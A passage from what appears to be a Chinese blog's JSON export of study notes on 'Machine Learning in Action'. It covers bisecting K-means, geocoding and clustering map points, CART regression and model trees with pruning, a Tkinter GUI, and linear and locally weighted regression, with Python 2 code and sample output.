&nbsp;&nbsp;&nbsp;&nbsp;计算总误差 &nbsp;&nbsp;&nbsp;&nbsp;在给定的簇上面进行K-均值聚类（k=2） &nbsp;&nbsp;&nbsp;&nbsp;计算将该簇一分为二后的总误差 选择使得误差最小的那个簇进行划分操作 函数biKmeans是上面二分K-均值聚类算法的实现，首先创建clusterAssment储存数据集中每个点的分类结果和平方误差，用centList保存所有已经划分的簇，初始状态为整个数据集。while循环不停对簇进行划分，寻找使得SSE值最大程度减小的簇并更新，添加新的簇到centList中。 1234567891011121314151617181920212223242526272829def biKmeans(dataSet, k, distMeas=distEclud): m = shape(dataSet)[0] clusterAssment = mat(zeros((m,2))) centroid0 = mean(dataSet, axis = 0).tolist()[0] centList = [centroid0] for j in range(m): clusterAssment[j,1] = distMeas(mat(centroid0), dataSet[j,:])**2 while (len(centList) &lt; k): lowestSSE = inf for i in range(len(centList)): ptsInCurrCluster = dataSet[nonzero(clusterAssment[:,0].A==i)[0],:] centroidMat, splitClustAss = kMeans(ptsInCurrCluster, 2, distMeas) sseSplit = sum(splitClustAss[:,1]) sseNotSplit = sum(clusterAssment[nonzero(clusterAssment[:,0].A!=i)[0],1]) print \"sseSplit, and notSplit: \", sseSplit, sseNotSplit if (sseSplit + sseNotSplit) &lt; lowestSSE: bestCentToSplit = i bestNewCents = centroidMat bestClustAss = splitClustAss.copy() lowestSSE = sseSplit + sseNotSplit bestClustAss[nonzero(bestClustAss[:,0].A==1)[0], 0] = len(centList) bestClustAss[nonzero(bestClustAss[:,0].A==0)[0], 0] = bestCentToSplit print \"The bestCentToSplit is: \", bestCentToSplit print \"The len of bestClustAss is: \", len(bestClustAss) centList[bestCentToSplit] = bestNewCents[0,:].tolist()[0] centList.append(bestNewCents[1,:].tolist()[0]) clusterAssment[nonzero(clusterAssment[:,0].A==bestCentToSplit)[0],:] = bestClustAss # 按顺序更新 return mat(centList), clusterAssment 运行上述函数多次，聚类会收敛到全局最小值，而kMeans函数偶尔会陷入局部最小值。 123456789&gt;&gt;&gt; datMat3 = mat(kMeans.loadDataSet('testSet2.txt'))&gt;&gt;&gt; centList, myNewAssments = kMeans.biKmeans(datMat3,3)sseSplit, and notSplit: 453.033489581 0.0The bestCentToSplit is: 0The len of bestClustAss is: 60sseSplit, and notSplit: 12.7532631369 423.876240137sseSplit, and notSplit: 77.5922493178 29.1572494441The bestCentToSplit is: 1The len of bestClustAss is: 40 对地图上的点进行聚类 使用Yahho！PlaceFinder API收集数据，筛选出目标地点的经纬度，用matplotlib构建一个二位数据图，包含簇、位置和地图。将俄勒冈州的70个地点聚类，地址列表为portlandClubs,txt。可以在Yahoo开发者网络进行注册，创建一个桌面应用以获取appid。书上给出的yahooAPI的baseurl已经改变，并且yahoo目前的placefinder需要OAuth2验证，要使用该api，须在header里或者get方法中加入六个必须的参数。github上有oauth2供python使用，但是yahoo的BOOS GEO好像OAuth2验证出了问题，虽然写了新的placeFinder调用api的代码，仍然会有403错误，yahoo单方面的问题。几个链接，要vpn：yahoo BOSS GEO的OAuth说明，yahoo placeFinder指南。上面的代码来自书上，下面的是适用于新的api的代码，但会返回403。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768import urllibimport jsondef geoGrab(stAddress, city): apiStem = 'http://where.yahooapis.com/geocode?' params = &#123;&#125; params['flags'] = 'J' params['appid'] = 'ppp68N8t' params['location'] = '%s %s' % (stAddress, city) url_params = urllib.urlencode(params) yahooApi = apiStem + url_params print yahooApi c = urllib.urlopen(yahooApi) print c.read() return json.loads(c.read())from time import sleepdef massPlaceFind(fileName): fw = open('places.txt', 'w') for line in open(fileName).readlines(): line = line.strip() lineArr = line.split('\\t') retDict = geoGrab(lineArr[1], lineArr[2]) if retDict['ResultSet']['Error'] == 0: lat = float(retDict['ResultSet']['Results'][0]['latitude']) lng = float(retDict['ResultSet']['Results'][0]['longitude']) print \"%s\\t%f\\t%f\" % (lineArr[0], lat, lng) fw.write('%s\\t%f\\t%f' % (line, lat, lng)) else: print \"error fetching\" sleep(1) fw.close()# Upper codes are from the book.# pst.py(codes for new apis)import urllib2import oauth2 as oauthimport timeOAUTH_CONSUMER_KEY = \"dj0yJmk9OTRRNmJWaEQwSWhPJm********RHdzROekV5TjJFbWN\\HbzlNQS0tJnM9Y29uc3VtZXJzZWNyZXQmeD03OQ--\"OAUTH_CONSUMER_SECRET = \"8caf5cfb4e8****2c30418f26805f99aa8e49728\"def oauth_request(url, params,method=\"GET\"): params['oauth_version'] = \"1.0\" #, params['oauth_nonce'] = oauth.generate_nonce() #, params['oauth_timestamp'] = int(time.time()) consumer = oauth.Consumer(key=OAUTH_CONSUMER_KEY, secret=OAUTH_CONSUMER_SECRET) params['oauth_consumer_key'] = consumer.key req = oauth.Request(method=method, url=url, parameters=params) req.sign_request(oauth.SignatureMethod_HMAC_SHA1(), consumer, None) return reqif __name__ == \"__main__\": url = \"http://yboss.yahooapis.com/geo/placefinder?\" req = oauth_request(url, params=&#123;\"q\": \"lianyungang\"&#125;) # This one is a bit nasty. Apparently the BOSS API does not like # \"+\" in its URLs so you have to replace \"%20\" manually. # Not sure if the API should be expected to accept either. # Not sure why to_url does not just return %20 instead... # Also, oauth2.Request seems to store parameters as unicode and forget # to encode to utf8 prior to percentage encoding them in its to_url # method. However, it's handled correctly for generating signatures. # to_url fails when query parameters contain non-ASCII characters. To # work around, manually utf8 encode the request parameters. req['q'] = req['q'].encode('utf8') req_url = req.to_url().replace('+', '%20') print req_url result = urllib2.urlopen(req_url) github附书代码里有生成好的place.txt，直接拿来使用。下面代码中，distSLC用球面余弦定理计算地球表面两个点之间的距离，clusterClubs将文件中的地点进行聚类并画出结果。为了画出这些簇，首先创建一幅图和一个矩形，然后用该矩形决定绘制图的哪一部分。 1234567891011121314151617181920212223242526272829303132def distSLC(vecA, vecB): a = sin(vecA[0,1]*pi/180) * sin(vecB[0,1]*pi/180) b = cos(vecA[0,1]*pi/180) * cos(vecB[0,1]*pi/180) *\\ cos(pi*(vecB[0,0]-vecA[0,0])/180) return arccos(a+b)*6371.0import matplotlibimport matplotlib.pyplot as pltdef clusterClubs(numClust=5): datList = [] for line in open('places.txt').readlines(): lineArr = line.split('\\t') datList.append([float(lineArr[4]), float(lineArr[3])]) datMat = mat(datList) myCentroids, clustAssing = biKmeans(datMat, numClust, distMeas = distSLC) fig = plt.figure() rect = [0.1, 0.1, 0.8, 0.8] scatterMarkers = ['s', 'o', '^', '8', 'p', 'd', 'v', 'h', '&gt;', '&lt;'] axprops = dict(xticks=[], yticks=[]) ax0 = fig.add_axes(rect, label = 'ax0', **axprops) imgP = plt.imread('Portland.png') ax0.imshow(imgP) ax1 = fig.add_axes(rect, label = 'ax1', frameon = False) for i in range(numClust): ptsInCurrCluster = datMat[nonzero(clustAssing[:,0].A == i)[0],:] markerSytle = scatterMarkers[i%len(scatterMarkers)] ax1.scatter(ptsInCurrCluster[:,0].flatten().A[0], \\ ptsInCurrCluster[:,1].flatten().A[0],\\ marker = markerSytle, s=90) ax1.scatter(myCentroids[:,0].flatten().A[0], myCentroids[:,1].flatten().A[0],\\ marker = '+', s=300) plt.show() 运行结果如下，分别是划分为5个簇、7个簇的情况。多次运行可以找到最佳的分簇数目和方法。 K-均值聚类算法总结 无监督学习指事先不知道要寻找的内容，没有目标变量。聚类将数据点归到多个簇中，可以使用多种方法计算相似度，实际使用时也应多次运行取较优结果。K-均值算法是一种广泛使用的聚类算法，k是用户指定的要创建的簇的数目，该算法非常有效但容易受到初始簇质心的影响。可以使用二分K-均值聚类算法获得更好的效果。 参考文献： 《机器学习实战 - 美Peter Harrington》 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2016/02/21/machinelearning10/) 、作者信息（Forec）和本声明。","categories":[{"name":"大数据/分布式系统","slug":"大数据-分布式系统","permalink":"http://forec.github.io/categories/大数据-分布式系统/"}],"tags":[{"name":"Algorithms","slug":"Algorithms","permalink":"http://forec.github.io/tags/Algorithms/"},{"name":"机器学习","slug":"机器学习","permalink":"http://forec.github.io/tags/机器学习/"}],"keywords":[{"name":"大数据/分布式系统","slug":"大数据-分布式系统","permalink":"http://forec.github.io/categories/大数据-分布式系统/"}]},{"title":"机器学习笔记（Chapter 09 - 树回归）","slug":"machinelearning9","date":"2016-02-20T03:44:31.000Z","updated":"2017-08-22T07:30:26.000Z","comments":true,"path":"2016/02/20/machinelearning9/","link":"","permalink":"http://forec.github.io/2016/02/20/machinelearning9/","excerpt":"第8章的线性回归创建的模型需要拟合所有的样本点（除了局部加权线性回归）。当数据拥有众多特征并且特征之间关系十分复杂时，构建全局模型的想法就比较困难，并且生活中很多问题是非线性的，无法用全局线性模型来拟合所有数据。一种方法是将数据集递归地切分成很多份易建模的数据，并对可以拟合的小数据集用线性回归建模。","text":"第8章的线性回归创建的模型需要拟合所有的样本点（除了局部加权线性回归）。当数据拥有众多特征并且特征之间关系十分复杂时，构建全局模型的想法就比较困难，并且生活中很多问题是非线性的，无法用全局线性模型来拟合所有数据。一种方法是将数据集递归地切分成很多份易建模的数据，并对可以拟合的小数据集用线性回归建模。 复杂数据的局部性建模 在Chapter03中介绍了贪心算法的决策树，构建算法是ID3，每次选取当前最佳特征来分割数据，并且按照这个特征的所有可能取值来划分，一旦切分完成，这个特征在之后的执行过程中不会再有任何用处。这种方法切分过于迅速，并且需要将连续型数据离散化后才能处理，这样就破坏了连续变量的内在性质。 二元切分法是另一种树构建算法，每次将数据集切分成两半，如果数据的某个特征满足这个切分的条件，就将这些数据放入左子树，否则右子树。二元切分法也节省了树的构建时间，但树一般都是离线构建，因此意义不大。CART（Classification And Regression Trees，分类回归树）使用二元切分来处理连续型变量，并用R^2取代香农熵来分析模型的效果。 连续和离散型特征的树的构建 使用字典存储树的数据结构，每个节点包含以下四个元素：待切分的特征、待切分的特征值、左子树、右子树。Chapter03中的每个节点可能有多个孩子，因此使用字典存储，而CART可以固定数据结构，因为每个非叶节点固定包含两个子树。下面创建回归树（叶节点包含单个值）和模型树（叶节点存储一个线性方程），创建树的代码可以重用，伪代码大致如下。 找到最佳的待切分特征： &nbsp;&nbsp;&nbsp;&nbsp;如果该节点不能再分，将该节点存为叶节点 &nbsp;&nbsp;&nbsp;&nbsp;执行二元切分 &nbsp;&nbsp;&nbsp;&nbsp;在左右子树分别递归调用 CART算法实现 - regTrees.py。binSplitDataSet通过数组过滤切分数据集，createTree递归建立树，输入参数决定树的类型，leafType给出建立叶节点的函数，因此该参数也决定了要建立的是模型树还是回归树，errType代表误差计算函数，ops是一个包含树构建所需的其他参数的元组。代码中的chooseBestSplit函数选取最佳分类方式，尚未实现。github上的附书源码有错误，binSplitDataSet的两行最后没有[0]。 1234567891011121314151617181920212223242526from numpy import *def loadDataSet(fileName): dataMat = [] fr = open(fileName) for line in fr.readlines(): curLine = line.strip().split('\\t') fltLine = map(float, curLine) dataMat.append(fltLine) return dataMatdef binSplitDataSet(dataSet, feature, value): mat0 = dataSet[nonzero(dataSet[:,feature] &gt; value)[0], :] mat1 = dataSet[nonzero(dataSet[:,feature] &lt;= value)[0], :] return mat0, mat1def createTree(dataSet, leafType = regLeaf, errType = regErr, ops=(1,4)): feat, val = chooseBestSplit(dataSet, leafType, errType, ops) if feat == None: return val retTree = &#123;&#125; retTree['spInd'] = feat retTree['spVal'] = val lSet, rSet = binSplitDataSet(dataSet, feat, val) retTree['left'] = createTree(lSet, leafType, errType, ops) retTree['right'] = createTree(rSet, leafType, errType, ops) return retTree 将CART算法用于回归 如何实现数据切分要取决于叶节点的建模方式，回归树假设叶节点是常数值，可以通过计算数据的总方差代替香农熵判断数据的混乱度。 函数chooseBestSplit的目标是找到数据切分的最佳位置，它遍历所有的特征及其可能的取值来找到使误差最小化的划分阈值。伪代码大致如下。 对每个特征：对每个特征值： &nbsp;&nbsp;&nbsp;&nbsp;将数据集划分为两份 &nbsp;&nbsp;&nbsp;&nbsp;计算切分的误差 &nbsp;&nbsp;&nbsp;&nbsp;若当前误差小于最小误差，则更新 返回最佳切分特征和阈值 回归树切分函数 - regTrees.py，regLeaf负责生成叶节点，在回归树中，该模型是目标变量的均值。regErr是误差估计函数，计算目标变量总方差。chooseBestSplit的参数中为ops设定了tolS和tolN，tolS是容许的误差下降值，tolN是切分的最小样本数。在三种情况下chooseBestSplit会停止切分：误差下降不够大、切分子集数目小、剩余的特征值都相同。github的附书源码也有问题，chooseBestSplit函数中，for splitVal in set(dataSet[:,featIndex]):要增加.T.tolist()[0]否则会报无法hash的错误。 1234567891011121314151617181920212223242526272829def regLeaf(dataSet): return mean(dataSet[:,-1])def regErr(dataSet): return var(dataSet[:,-1]) * shape(dataSet)[0]def chooseBestSplit(dataSet, leafType = regLeaf, errType = regErr, ops = (1,4)): tolS = ops[0]; tolN = ops[1] if len(set(dataSet[:,-1].T.tolist()[0])) == 1: return None, leafType(dataSet) m, n = shape(dataSet) S = errType(dataSet) bestS = inf; bestIndex = 0; bestValue = 0 for featIndex in range(n-1): for splitVal in set(dataSet[:,featIndex].T.tolist()[0]): mat0, mat1 = binSplitDataSet(dataSet, featIndex, splitVal) if (shape(mat0)[0] &lt; tolN) or (shape(mat1)[0] &lt; tolN): continue newS = errType(mat0) + errType(mat1) if newS &lt; bestS: bestIndex = featIndex bestValue = splitVal bestS = newS if (S - bestS) &lt; tolS: return None, leafType(dataSet) mat0, mat1 = binSplitDataSet(dataSet, bestIndex, bestValue) if (shape(mat0)[0] &lt; tolN) or (shape(mat1)[0] &lt; tolN): return None, leafType(dataSet) return bestIndex, bestValue 测试代码效果，数据来自ex00.txt和ex0.txt，用matplotlib绘制的图像如下。 12345678&gt;&gt;&gt; reload(regTrees)&gt;&gt;&gt; from numpy import *&gt;&gt;&gt; myDat = mat(regTrees.loadDataSet('ex00.txt'))&gt;&gt;&gt; regTrees.createTree(myMat)&#123;'spInd': 0, 'spVal': 0.48813, 'right': -0.044650285714285719, 'left': 1.0180967672413792&#125;&gt;&gt;&gt; myDat1 = mat(regTrees.loadDataSet('ex0.txt'))&gt;&gt;&gt; regTrees.createTree(myDat1)&#123;'spInd': 1, 'spVal': 0.39435, 'right': &#123;'spInd': 1, 'spVal': 0.197834, 'right': -0.023838155555555553, 'left': 1.0289583666666666&#125;, 'left': &#123;'spInd': 1, 'spVal': 0.582002, 'right': 1.980035071428571, 'left': &#123;'spInd': 1, 'spVal': 0.797583, 'right': 2.9836209534883724, 'left': 3.9871631999999999&#125;&#125;&#125; 树剪枝 如果树节点过多，则该模型可能对数据过拟合，通过降低决策树的复杂度来避免过拟合的过程称为剪枝。在函数chooseBestSplit中的三个提前终止条件是“预剪枝”操作，另一种形式的剪枝需要使用测试集和训练集，称作“后剪枝”。 预剪枝 树构建算法对输入的tolS和tolN非常敏感，将ops换为(0,1)会发现生成的树非常臃肿，几乎为数据集中的每个样本都分配了一个叶节点。加载ex2.txt的数据，该数据集和前面ex00.txt的数据分布类似，但数量级是后者的100倍，在这种情况下，ex00构建出的树只有两个叶节点，而ex2构建出的树有非常多的叶节点。原因在于停止条件tolS对误差的数量级非常敏感。显然，通过不断修改停止条件并且比较哪个条件更好并不合理，多数情况下我们并不确定要寻找什么样的结果，计算机应该给出总体的概貌。 后剪枝 使用后剪枝方法需要将数据集交叉验证，首先给定参数，使得构建出的树足够复杂，之后从上而下找到叶节点，判断合并两个叶节点是否能够取得更好的测试误差，如果是就合并。下面是回归树剪枝函数。函数isTree测试输入变量是否为一棵树，getMean对树进行塌陷处理，计算整棵树的平均值。prune函数对树剪枝，参数tree为待剪枝的树，testData是测试集。需要注意的是，测试集合训练集样本的取值范围不一定相同。 123456789101112131415161718192021222324252627def isTree(obj): return (type(obj).__name__ =='dict')def getMean(tree): if isTree(tree['right']): tree['right'] = getMean(tree['right']) if isTree(tree['left']): tree['left'] = getMean(tree['left']) return (tree['left'] + tree['right'])/2.0def prune(tree, testData): if shape(testData)[0] == 0: return getMean(tree) if (isTree(tree['right']) or isTree(tree['left'])): lSet, rSet = binSplitDataSet(testData, tree['spInd'], tree['spVal']) if isTree(tree['left']): tree['left'] = prune(tree['left'], lSet) if isTree(tree['right']): tree['right'] = prune(tree['right'], rSet) if not isTree(tree['left']) and not isTree(tree['right']): lSet, rSet = binSplitDataSet(testData, tree['spInd'], tree['spVal']) errNoMerge = sum(power(lSet[:,-1] - tree['left'], 2)) +\\ sum(power(rSet[:,-1] - tree['right'], 2)) treeMean = (tree['left']+tree['right'])/2.0 errorMerge = sum(power(testData[:,-1] - treeMean, 2)) if errorMerge &lt; errNoMerge: print \"merging\" return treeMean else: return tree else: return tree 模型树 将叶节点设置为分段线性函数，分段线性指模型由多个线性片段组成。例如下图的数据，可以由0.0~0.3和0.3~1.0的两条直线组成。决策树相比其他机器学习算法易于理解，而模型树的可解释性是它优于回归树的特性之一。模型树同时具备更高的预测准确度。 前面的代码已经给出了构建树的代码，只要修改参数errType和leafType。对于给定的数据集，先用现行的模型对它进行拟合，然后计算真实目标值和模型预测值之间的差距。最后求这些差值的平方和作为误差。modelLeaf函数生成叶节点，linearSolve返回回归系数，modelErr在数据集上调用linearSove，返回yHat和y之间的平方误差。 12345678910111213141516171819202122232425def linearSolve(dataSet): m, n = shape(dataSet) X = mat(ones((m,n))); Y = mat(ones((m,1))) X[:,1:n] = dataSet[:,0:n-1]; Y = dataSet[:,-1] xTx = X.T * X if linalg.det(xTx) == 0.0: raise NameError('This matrix is singular, cannot do inverses,\\n\\ try increasing the second value of ops') ws = xTx.I * (X.T * Y) return ws, X, Ydef modelLeaf(dataSet): ws, X, Y = linearSolve(dataSet) return wsdef modelErr(dataSet): ws, X, Y = linearSolve(dataSet) yHat = X * ws return sum(power(Y - yHat, 2))&gt;&gt;&gt; myMat2 = mat(regTrees.loadDataSet('exp2.txt'))&gt;&gt;&gt; regTrees.createTree(myMat2, regTrees.modelLeaf, regTrees.modelErr, (1,10))&#123;'spInd': 0, 'spVal': 0.285477, 'right': matrix([[ 3.46877936], [ 1.18521743]]), 'left': matrix([[ 1.69855694e-03], [ 1.19647739e+01]])&#125; 树回归和标准回归的比较 对于输入的单个数据点，函数treeForeCast返回一个预测值。参数modelEval是对叶节点数据进行预测的函数的引用，函数treeForeCast自顶向下遍历整棵树，直到命中叶节点为止。一旦到达叶节点，它会在输入数据上调用modelEval，该参数默认值是regTreeEval。要对回归树叶节点预测，就调用regTreeEval，要对模型树节点预测，调用modelTreeEval。 12345678910111213141516171819202122232425262728def regTreeEval(model, inDat): return float(model)def modelTreeEval(model, inDat): n = shape(inDat)[1] X = mat(ones((1,n+1))) X[:,1:n+1] = inDat return float(X*model)def treeForeCast(tree, inData, modelEval = regTreeEval): if not isTree(tree): return modelEval(tree, inData) if inData[tree['spInd']] &gt; tree['spVal']: if isTree(tree['left']): return treeForeCast(tree['left'], inData, modelEval) else: return modelEval(tree['left'], inData) else: if isTree(tree['right']): return treeForeCast(tree['right'], inData, modelEval) else: return modelEval(tree['right'], inData)def createForeCast(tree, testData, modelEval = regTreeEval): m = len(testData) yHat = mat(zeros((m,1))) for i in range(m): yHat[i,0] = treeForeCast(tree, mat(testData[i]), modelEval) return yHat 比较回归树、模型树和标准线性回归的R^2数值。可以看出，模型树的结果比回归树好，而树回归方法在预测复杂数据时会比简单的线性模型更有效。 123456789101112131415161718&gt;&gt;&gt; trainMat = mat(regTrees.loadDataSet('bikeSpeedVsIq_train.txt'))&gt;&gt;&gt; testMat = mat(regTrees.loadDataSet('bikeSpeedVsIq_test.txt'))&gt;&gt;&gt; myTree = regTrees.createTree(trainMat, ops=(1,20))&gt;&gt;&gt; yHat = regTrees.createForeCast(myTree, testMat[:,0])&gt;&gt;&gt; corrcoef(yHat, testMat[:,1], rowvar=0)[0,1]0.96408523182221395&gt;&gt;&gt; myTree = regTrees.createTree(trainMat, regTrees.modelLeaf, regTrees.modelErr, ops=(1,20))&gt;&gt;&gt; yHat = regTrees.createForeCast(myTree, testMat[:,0], regTrees.modelTreeEval)&gt;&gt;&gt; corrcoef(yHat, testMat[:,1], rowvar=0)[0,1]0.97604121913806363&gt;&gt;&gt; ws, X, Y = regTrees.linearSolve(trainMat)&gt;&gt;&gt; wsmatrix([[ 37.58916794], [ 6.18978355]])&gt;&gt;&gt; for i in range(shape(testMat)[0]):... yHat[i] = testMat[i,0]*ws[1,0]+ws[0,0]&gt;&gt;&gt; corrcoef(yHat, testMat[:,1], rowvar=0)[0,1]0.94346842356747584 Tkinter库创建GUI Tkinter模块的.grid()方法将widget安排在一个二维表格内，，默认widget会显示在0行0列，可以通过设定columnspan和rowspan来告诉布局管理器是否允许一个widget跨行或跨列。界面代码如下 - treeExplore.py。 123456789101112131415161718192021222324252627282930313233from numpy import *from Tkinter import *import regTreesdef redraw(tolS, tolN): passdef drawNewTree(): passroot = Tk()Label(root, text=\"Plot Place Holder\").grid(row = 0, columnspan = 3)Label(root, text=\"tolN\").grid(row = 1, column = 0)tolNentry = Entry(root)tolNentry.grid(row = 1, column = 1)tolNentry.insert(0,'10')Label(root, text=\"tolS\").grid(row = 2, column =0 )tolSentry = Entry(root)tolSentry.grid(row = 2, column = 1)tolSentry.insert(0,'1.0')Label(root, text=\"path\").grid(row = 3, column = 0)datPentry = Entry(root)datPentry.grid(row = 3, column = 1)datPentry.insert(0,'sine.txt')Button(root, text=\"ReDraw\", command = drawNewTree).grid(row = 1, column =2, rowspan =3)chkBtnVar = IntVar()chkBtn = Checkbutton(root, text=\"Model Tree\", variable = chkBtnVar)chkBtn.grid(row = 4, column = 0, columnspan=2)reDraw.rawDat = mat(regTrees.loadDataSet('sine.txt'))reDraw.testDat = arange(min(reDraw.rawDat[:,0]), max(reDraw.rawDat[:,0]), 0.01)reDraw(1.0, 10)root.mainloop() Matplotlib的构建程序包含一个前端面向用户，如plot和scatter方法等，同时创建一个后端，用于实现绘图和不同应用程序之间的接口。改变后端可以将图像绘制不同格式的文件上，将后端在设置为TkAgg，可以在所选GUI框架上调用Agg，呈现在画布上。下面的代码填补了上面的两个占位函数，另外将上面代码中加载文件的语句移入了按钮事件。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748import matplotlibmatplotlib.use('TkAgg')from matplotlib.backends.backend_tkagg import FigureCanvasTkAggfrom matplotlib.figure import Figuredef reDraw(tolS, tolN): reDraw.f.clf() reDraw.a = reDraw.f.add_subplot(111) if chkBtnVar.get(): if tolN &lt; 2: tolN = 2 myTree = regTrees.createTree(reDraw.rawDat, regTrees.modelLeaf, regTrees.modelErr, (tolS, tolN)) yHat = regTrees.createForeCast(myTree, reDraw.testDat, regTrees.modelTreeEval) else: myTree = regTrees.createTree(reDraw.rawDat, ops=(tolS, tolN)) yHat = regTrees.createForeCast(myTree, reDraw.testDat) reDraw.a.scatter(reDraw.rawDat[:,0], reDraw.rawDat[:,1], s=5) reDraw.a.plot(reDraw.testDat, yHat, linewidth = 2.0) reDraw.canvas.show()def getInputs(): try: tolN = int(tolNentry.get()) except: tolN = 10 print \"enter Integer for tolN\" tolNentry.delete(0, END) tolNentry.insert(0, '10') try: tolS = float(tolSentry.get()) except: tolS = 1.0 print \"enter Integer for tolS\" tolSentry.delete(0, END) tolSentry.insert(0, '1.0') try: datPath = str(datPentry.get()) except: datPath = '' print \"enter path for test data\" tolSentry.delete(0, END) tolSentry.insert(0, '') return datPath, tolS, tolNdef drawNewTree(): datPath, tolS, tolN = getInputs() try: reDraw.rawDat = mat(regTrees.loadDataSet(datPath)) reDraw.testDat = arange(min(reDraw.rawDat[:,0]), max(reDraw.rawDat[:,0]), 0.01) reDraw(tolS, tolN) except: print \"Cannot find file %s\" % datPath 绘制出的GUI界面如下。 参考文献： 《机器学习实战 - 美Peter Harrington》 原创作品，允许转载，转载时无需告知，但请务必以超链接形式标明文章原始出处(https://forec.github.io/2016/02/20/machinelearning9/) 、作者信息（Forec）和本声明。","categories":[{"name":"大数据/分布式系统","slug":"大数据-分布式系统","permalink":"http://forec.github.io/categories/大数据-分布式系统/"}],"tags":[{"name":"Algorithms","slug":"Algorithms","permalink":"http://forec.github.io/tags/Algorithms/"},{"name":"机器学习","slug":"机器学习","permalink":"http://forec.github.io/tags/机器学习/"}],"keywords":[{"name":"大数据/分布式系统","slug":"大数据-分布式系统","permalink":"http://forec.github.io/categories/大数据-分布式系统/"}]},{"title":"机器学习笔记（Chapter 08 - 回归）","slug":"machinelearning8","date":"2016-02-18T12:07:58.000Z","updated":"2017-08-22T07:30:30.000Z","comments":true,"path":"2016/02/18/machinelearning8/","link":"","permalink":"http://forec.github.io/2016/02/18/machinelearning8/","excerpt":"回归是前面监督学习方法的延续，监督学习指的是有目标变量或者预测目标的机器学习方法。回归于分类的不同在于其目标变量是连续数值型。","text":"回归是前面监督学习方法的延续，监督学习指的是有目标变量或者预测目标的机器学习方法。回归于分类的不同在于其目标变量是连续数值型。 线性回归找到最佳拟合曲线 线性回归结果易于理解，计算上不复杂，但对非线性的数据拟合不好。适用于数值型和标称型数据。 回归的目的是预测数值型的目标值。最直接的办法是根据输入写出一个目标值的计算公式，这个公式就是回归方程。求解回归系数的过程就是回归。回归一般指线性回归，本章中二者同义。线性回归意味着可以将输入项分别乘以一些常量，再将结果加起来得到输出，而非线性回归模型则认为输出可能是输入的乘积。 回归的一般方法 收集数据：任意方法 准备数据：需要数值型数据，标称型数据将被转换成二值型数据。 分析数据：绘出数据的可视化二维图有助于对数据做出理解和分析。在采用所见发求得新回归系数后，可以将新拟合线在图上作为对比。 训练算法：找到回归系数。 测试算法：使用R^2或者预测值和数据的拟合度来分析模型的效果。 使用算法：使用回归可以在给定一个输入的时候预测一个数值，这是对分类方法的提升，可以预测连续性数据而不仅仅是离散的类别标签。 求解回归系数：假定输入数据存放在矩阵X中，回归系数存放在向量W中，对于给定的数据X1，预测结果会通过Y1=X^T·W给出。要找到W，最常用的方法是找出使误差最小的W。误差指预测y值和真实y值之间的差值，使用该误差的简单累加会使正负误差相互抵消，因此采用平方误差。平方误差写作∑(y&#39;-x^T·W)^2，用矩阵表示写作(y-Xw)^T·(y-Xw)，如果对w求导，就得到X^T·(Y-Xw)，令其为零，解出w=(X^T·X)^(-1)·X^T·y。注意公式中包含了(X^T·X)^(-1)，因此要在代码中判断矩阵是否可逆。该方法称为OLS（普通最小二乘法）。 下面是原始数据点的分布 标准回归函数和数据导入函数 - regression.py 1234567891011121314151617181920212223from numpy import *def loadDataSet(fileName): numFeat = len(open(fileName).readline().split('\\t')) - 1 dataMat = []; labelMat = [] fr = open(fileName) for line in fr.readlines(): lineArr = [] curLine = line.strip().split('\\t') for i in range(numFeat): lineArr.append(float(curLine[i])) dataMat.append(lineArr) labelMat.append(float(curLine[-1])) return dataMat, labelMatdef standRegres(xArr, yArr): xMat = mat(xArr); yMat = mat(yArr).T xTx = xMat.T * xMat if linalg.det(xTx) == 0.0: print \"This matrix is singular, cannot do reverse\" return ws = xTx.I * (xMat.T * yMat) return ws 生成的线性回归效果图如下 Numpy库提供了corrcoef(yEstimate, yActure)方法来计算预测值和真实值的相关性。下面的交互代码结果中，yMat和自己匹配是最完美的，而yHat和yMat的相关系数为0.98。 1234&gt;&gt;&gt; yHat = xMat * ws&gt;&gt;&gt; corrcoef(yHat.T, yMat)array([[1. , 0.98647356], [0.98647356, 1. ]]) 局部加权线性回归 LWLR 最佳拟合直线方法将数据视为直线建模，但数据似乎有其他潜在模式。线性回归的一个问题是有可能出现欠拟合现象，因为他求的是具有最小均方误差的无偏估计。因此有些方法允许在估计中引入一些偏差，从而降低预测的均方误差。其中一个方法是局部加权线性回归（Locally Weighted Linear Regression）。在该算法中，为待测点附近的每个点赋予一定的权重，然后在这个子集上基于最小均方差来进行普通的回归。和kNN一样，这种算法每次预测都需要先选取出对应的数据子集。解出回归系数w的形式如下w=(X^T·WX)^(-1)·X^T·W·y，其中W是一个矩阵，用来给每个数据点赋予权重。 LWLR使用“核”（和SVM类似）来为附近的点赋予更高的权重。类似kNN，LWLR认为样本点距离越近，越有可能符合同一个线性模型。高斯核对应权重如下w(i,i) = exp(|x&#39;-x|/(-2k^2))。这样就构建了只含对角元素的权重矩阵W，并且点x和x(i)越近，w(i,i)就越大。参数k由用户指定，决定了对附近的点赋予多大的权重。当k较大时，更多的数据被用来训练回归模型，当k较小时，仅有很少的局部点被用来训练回归模型。 局部加权线性回归函数 - regression.py 1234567891011121314151617181920def lwlr(testPoint, xArr, yArr, k = 1.0): xMat = mat(xArr); yMat = mat(yArr).T m = shape(xMat)[0] weights = mat(eye(m)) for j in range(m): diffMat = testPoint - xMat[j,:] weights[j,j] = exp(diffMat*diffMat.T/(-2.0*k**2)) xTx = xMat.T * (weights * xMat) if linalg.det(xTx) == 0.0: print \"This matrix is singular, cannot do reverse\" return ws = xTx.I * (xMat.T * (weights * yMat)) return testPoint * wsdef lwlrTest(testArr, xArr, yArr, k = 1.0): m = shape(testArr)[0] yHat = zeros(m) for i in range(m): yHat[i] = lwlr(testArr[i], xArr, yArr, k) return yHat 添加代码绘制在不同k的情况下局部加权线性回归结果的拟合情况。 12345678910111213141516def drawPlotAboutK(): xArr, yArr = loadDataSet('ex0.txt') xMat = mat(xArr) srtInd = xMat[:,1].argsort(0) xSrot = xMat[srtInd][:,0,:] import matplotlib.pyplot as plt fig = plt.figure() ax = fig.add_subplot(211) yHat01 = lwlrTest(xArr, xArr, yArr, 0.01) ax.plot(xSrot[:,1],yHat01[srtInd]) ax.scatter(xMat[:,1].flatten().A[0], mat(yArr).T.flatten().A[0], s =2, c='green') ax = fig.add_subplot(212) yHat001 = lwlrTest(xArr, xArr, yArr, 0.003) ax.plot(xSrot[:,1],yHat001[srtInd]) ax.scatter(xMat[:,1].flatten().A[0], mat(yArr).T.flatten().A[0], s =2, c='green') 